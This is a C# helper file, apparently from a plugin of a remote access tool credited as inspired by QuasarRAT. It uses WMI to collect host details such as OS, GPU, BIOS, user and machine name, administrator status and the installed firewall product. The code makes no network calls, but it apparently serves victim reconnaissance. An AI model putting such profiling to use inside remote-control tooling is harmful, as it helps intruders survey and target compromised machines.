using System;
using System.Management;
using System.Net;
using System.Security.Principal;
using static PacketLib.Packet.SystemInformation;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
|| Inspiration : QuasarRAT  ||
*/

namespace Plugin
{
    internal static class Helpers
    {
        internal static string RemoveLastChars(string input, int amount = 2)
        {
            if (input.Length > amount)
                input = input.Remove(input.Length - amount);
            return input;
        }
        #region "Network"
        internal static string GetIpAddress(long ipAddrs)
        {
            string text;
            try
            {
                text = new IPAddress(ipAddrs).ToString();
            }
            catch
            {
                text = ipAddrs.ToString();
            }
            return text;
        }

        internal static ushort GetTcpPort(int tcpPort)
        {
            return Imports.ntohs((ushort)tcpPort);
        }
        #endregion
        #region "Hardware"
        internal static string GetWMIInformation(string askedInfo, string query = "SELECT * FROM Win32_OperatingSystem")
        {
            try
            {
                string information = string.Empty;
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        information = mObject[askedInfo].ToString();
                        break;
                    }
                }
                return (!string.IsNullOrEmpty(information)) ? information : "N/A";
            }
            catch
            { }
            return "Unknown";
        }

        internal static string GetResolution()
        {
            return GetWMIInformation("CurrentHorizontalResolution", "SELECT * FROM Win32_VideoController") + " x " + GetWMIInformation("CurrentVerticalResolution", "SELECT * FROM Win32_VideoController");
        }

        internal static string GetGpuName()
        {
            try
            {
                string gpuName = string.Empty;
                string query = "SELECT * FROM Win32_DisplayConfiguration";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        gpuName += mObject["Description"].ToString() + "; ";
                    }
                }
                gpuName = RemoveLastChars(gpuName);

                return (!string.IsNullOrEmpty(gpuName)) ? gpuName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }


        internal static string GetDebug()
        {
            try
            {
                string debugged = string.Empty;
                string query = "SELECT * FROM Win32_OperatingSystem";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        debugged += mObject["Debug"].ToString() + "; ";
                    }
                }
                debugged = RemoveLastChars(debugged);

                return (!string.IsNullOrEmpty(debugged)) ? debugged : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        internal static string GetBiosDescription()
        {
            try
            {
                string biosIdentifier = string.Empty;
                string query = "SELECT * FROM Win32_BIOS";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        biosIdentifier = mObject["Description"].ToString();
                        break;
                    }
                }

                return (!string.IsNullOrEmpty(biosIdentifier)) ? biosIdentifier : "N/A";
            }
            catch
            {
            }

            return "Unknown";
        }

        internal static string GetOsType()
        {
            try
            {
                string osType = string.Empty;
                string query = "SELECT * FROM Win32_OperatingSystem";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        osType = mObject["OSType"].ToString();
                        osType = ((WMIHelpers.OSType)int.Parse(osType)).ToString();
                        break;
                    }
                }

                return (!string.IsNullOrEmpty(osType)) ? osType : "N/A";
            }
            catch
            {
            }
            return "Unknown";
        }

        internal static string GetMainboardName()
        {
            try
            {
                string mainboardIdentifier = string.Empty;
                string query = "SELECT * FROM Win32_BaseBoard";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        mainboardIdentifier = mObject["Manufacturer"].ToString() + " " + mObject["Product"].ToString();
                        break;
                    }
                }

                return (!string.IsNullOrEmpty(mainboardIdentifier)) ? mainboardIdentifier : "N/A";
            }
            catch
            {
            }

            return "Unknown";
        }

        internal static string GetUserName()
        {
            return Environment.UserName;
        }

        internal static string GetPcName()
        {
            return Environment.MachineName;
        }

        internal static AccountType GetUserType()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);

                if (principal.IsInRole(WindowsBuiltInRole.Administrator))
                {
                    return AccountType.Admin;
                }
                else if (principal.IsInRole(WindowsBuiltInRole.User))
                {
                    return AccountType.User;
                }
                else if (principal.IsInRole(WindowsBuiltInRole.Guest))
                {
                    return AccountType.Guest;
                }
                else
                {
                    return AccountType.Unknown;
                }
            }
        }

        internal static string GetFirewall()
        {
            try
            {
                string firewallName = string.Empty;
                string scope = "root\\SecurityCenter2";
                string query = "SELECT * FROM FirewallProduct";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        firewallName += mObject["displayName"].ToString() + "; ";
                    }
                }
                firewallName = RemoveLastChars(firewallName);

                return (!string.IsNullOrEmpty(firewallName)) ? firewallName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }
        #endregion
    }
}
